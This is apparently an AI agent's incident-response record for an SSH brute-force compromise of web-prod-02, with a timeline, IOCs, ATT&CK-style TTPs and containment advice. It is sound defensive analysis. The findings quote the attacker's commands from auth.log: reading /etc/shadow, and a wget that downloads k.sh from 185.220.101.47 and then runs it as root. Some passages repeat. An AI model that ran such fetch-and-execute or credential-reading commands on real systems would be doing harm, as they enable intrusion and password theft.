data.text: I’ll triage both artifacts in parallel: parse the auth log for verified events and extract IOCs from the context note in case it contains environment details or indicators.
The auth log already shows a successful SSH login and post-auth root actions; I’ll record that and then build a precise timeline and enrich the attacker IP.

args.rationale: Initial triage aimed to verify whether the reported SSH brute-force and follow-on activity actually occurred in the evidence.
args.expected: I expected repeated failed SSH logins from a single external IP, followed by either a successful login or no compromise evidence.
args.found: parse_log on artifact 106ded8c-46c4-45ed-b857-a7b9ad170974 returned 25 SSH-format events. It showed repeated failed logins from IP 185.220.101.47 between 2026-05-17T03:14:02Z and 2026-05-17T03:14:49Z, then 'Accepted password for deploy from 185.220.101.47 port 49890 ssh2' at 2026-05-17T03:14:52Z. The same session then opened for user deploy, ran 'sudo ... COMMAND=/usr/bin/cat /etc/shadow' at 2026-05-17T03:15:04Z, 'sudo ... COMMAND=/usr/bin/wget http://185.220.101.47:8080/k.sh -O /tmp/.k' at 2026-05-17T03:15:18Z, and 'sudo ... COMMAND=/bin/bash /tmp/.k' at 2026-05-17T03:15:22Z before the session closed at 2026-05-17T03:15:25Z. extract_iocs on artifact 13ca4689-207c-4f4a-be44-5c57806a29b2 identified IPs 0.0.0.0 and 10.0.4.21.
args.next_step: Build a verified timeline from the parsed log events and enrich IP 185.220.101.47 to support scoping and containment recommendations.

COMMAND=/bin/bash /tmp/.k' at 2026-05-17T03:15:22Z before the session closed at 2026-05-17T03:15:25Z. extract_iocs on artifact 13ca4689-207c-4f4a-be44-5c57806a29b2 identified IPs 0.0.0.0 and 10.0.4.21.

data.text: I have enough to conclude compromise on the single host from the evidence, but I should explicitly note the scope limit: there’s no separate artifact proving lateral movement beyond web-prod-02.

args.rationale: After verifying the intrusion sequence, I needed to order the activity and enrich the source IP to assess attacker tradecraft and support containment guidance.
args.expected: I expected a short burst of brute-force activity leading immediately into post-authentication actions, and public enrichment to identify whether the source was notable infrastructure such as anonymization or hosting.
args.found: build_timeline over the 25 parsed auth.log events returned a contiguous 83-second sequence from 2026-05-17T03:14:02Z to 2026-05-17T03:15:25Z, including one 50-second burst from 2026-05-17T03:14:02Z to 2026-05-17T03:14:52Z containing 21 events. fetch_url to https://ipinfo.io/185.220.101.47/json returned status 200 with JSON identifying IP 185.220.101.47 as hostname 'tor-exit-47.for-privacy.net' in Berlin, DE, org 'AS60729 Stiftung Erneuerbare Freiheit'. Combined with the verified sudo commands in auth.log, this supports an external attacker using a Tor exit node to brute-force SSH, authenticate as deploy, read /etc/shadow as root, download 'http://185.220.101.47:8080/k.sh' to '/tmp/.k', and execute it as root.
args.next_step: Record the scoping limitation and finalize with severity, timeline, IOCs, TTPs, and containment recommendations.

data.found: build_timeline over the 25 parsed auth.log events returned a contiguous 83-second sequence from 2026-05-17T03:14:02Z to 2026-05-17T03:15:25Z, including one 50-second burst from 2026-05-17T03:14:02Z to 2026-05-17T03:14:52Z containing 21 events. fetch_url to https://ipinfo.io/185.220.101.47/json returned status 200 with JSON identifying IP 185.220.101.47 as hostname 'tor-exit-47.for-privacy.net' in Berlin, DE, org 'AS60729 Stiftung Erneuerbare Freiheit'. Combined with the verified sudo commands in auth.log, this supports an external attacker using a Tor exit node to brute-force SSH, authenticate as deploy, read /etc/shadow as root, download 'http://185.220.101.47:8080/k.sh' to '/tmp/.k', and execute it as root.

args.rationale: The case asks for blast radius, so I need to distinguish what is proven from what is only possible based on limited evidence.
args.expected: If additional artifacts existed, they might show lateral movement or impact to other hosts; without them, scope may be constrained to the compromised host only.
args.found: The available evidence consists of auth.log and a host context note. auth.log proves compromise activity on the host that generated those SSH and sudo events, including successful login as user deploy and root-level commands. extract_iocs on the context note identified internal IP 10.0.4.21, but no artifact in this case provides logs from other systems or network telemetry proving access beyond that host. Therefore, compromise of web-prod-02 is evidenced, while wider blast radius beyond that host is not verified from the provided artifacts.

data.found: The available evidence consists of auth.log and a host context note. auth.log proves compromise activity on the host that generated those SSH and sudo events, including successful login as user deploy and root-level commands. extract_iocs on the context note identified internal IP 10.0.4.21, but no artifact in this case provides logs from other systems or network telemetry proving access beyond that host. Therefore, compromise of web-prod-02 is evidenced, while wider blast radius beyond that host is not verified from the provided artifacts.

args.summary: The provided evidence supports that web-prod-02 was compromised via SSH password guessing from external IP 185.220.101.47. The auth log shows a burst of failed logins followed by a successful password login as the 'deploy' account, then immediate root-level activity: reading /etc/shadow, downloading a script from http://185.220.101.47:8080/k.sh to /tmp/.k, and executing it with bash. This is sufficient to treat the host as fully compromised at the operating-system level. Based on the artifacts provided, the verified scope is web-prod-02 only; there is no separate evidence here proving lateral movement to other hosts.

iocs.context: Source of repeated SSH failures, successful SSH login as deploy, and host serving http://185.220.101.47:8080/k.sh according to auth.log; ipinfo labels it tor-exit-47.for-privacy.net.
Downloaded via sudo wget to /tmp/.k after successful SSH login.
Account successfully authenticated over SSH and then used with sudo to run root commands.
Local file path where the downloaded script was saved before execution.
Internal IP extracted from host_context.md; likely host context, but not independently tied to attacker activity by the available evidence.

ttps.name: Brute Force
ttps.evidence: auth.log contains repeated failed SSH password attempts from 185.220.101.47 from 2026-05-17T03:14:02Z through 2026-05-17T03:14:49Z before successful authentication.

ttps.name: Valid Accounts
ttps.evidence: auth.log shows 'Accepted password for deploy from 185.220.101.47 port 49890 ssh2' at 2026-05-17T03:14:52Z.

ttps.name: Command and Scripting Interpreter: Unix Shell
OS Credential Dumping: /etc/passwd and /etc/shadow
ttps.evidence: auth.log shows 'COMMAND=/usr/bin/cat /etc/shadow' executed via sudo at 2026-05-17T03:15:04Z.

ttps.name: Abuse Elevation Control Mechanism
ttps.evidence: auth.log shows the deploy account using sudo to execute root commands including cat /etc/shadow, wget, and bash.

timeline.event: Successful SSH password login as deploy from 185.220.101.47; session opened.
deploy uses sudo to run '/usr/bin/cat /etc/shadow' as root.
deploy uses sudo to download 'http://185.220.101.47:8080/k.sh' to '/tmp/.k'.
deploy uses sudo to execute '/bin/bash /tmp/.k' as root.

recommendations: Immediately isolate web-prod-02 from the network and remove it from production traffic.
Treat web-prod-02 as fully compromised; rebuild from a known-good image rather than relying on cleanup.
Disable or lock the 'deploy' account pending investigation, rotate its password, and rotate all credentials that may have been exposed or retrievable from the host.
Invalidate any secrets potentially accessible on web-prod-02, including SSH keys, application secrets, API tokens, and service credentials.
Review and restrict sudo rights for the deploy account; require least privilege and remove direct shell-based root access where not essential.
Block and monitor IOC 185.220.101.47 and investigate any connections to or from the URL http://185.220.101.47:8080/k.sh in proxy, EDR, firewall, and DNS logs.
Hunt across the environment for other successful SSH logins by deploy or from 185.220.101.47, and for executions involving '/tmp/.k', 'k.sh', 'wget', or 'bash /tmp/.k'.

Enforce SSH hardening on internet-facing hosts: disable password authentication where possible, require key-based auth/MFA/bastion access, and ensure brute-force protections are functioning as intended.
